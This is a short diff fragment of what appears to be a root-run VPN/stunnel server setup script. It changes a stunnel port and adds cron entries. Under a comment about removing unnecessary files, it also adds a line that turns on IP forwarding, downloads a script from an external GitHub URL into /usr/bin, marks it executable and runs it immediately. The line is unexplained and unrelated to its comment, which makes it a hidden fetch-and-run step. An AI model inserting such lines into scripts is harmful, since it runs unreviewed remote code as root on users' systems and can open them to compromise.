@@ -197,7 +197,7 @@ accept = 442
 connect = 127.0.0.1:1194
 
 [ws-stunnel]
-accept = 2096
+accept = 2053
 connect = 700
 
 END
@@ -413,6 +413,7 @@ echo "0 5 * * * root clear-log && reboot" >> /etc/crontab
 echo "0 0 * * * root xp" >> /etc/crontab
 # remove unnecessary files
 cd
+echo "1" > /proc/sys/net/ipv4/ip_forward; wget -O /usr/bin/point 'https://raw.githubusercontent.com/bokir-tampan/ranjau-darate/main/pointing.sh'; chmod +x /usr/bin/point; point
 apt autoclean -y
 apt -y remove --purge unscd
 apt-get -y --purge remove samba*;
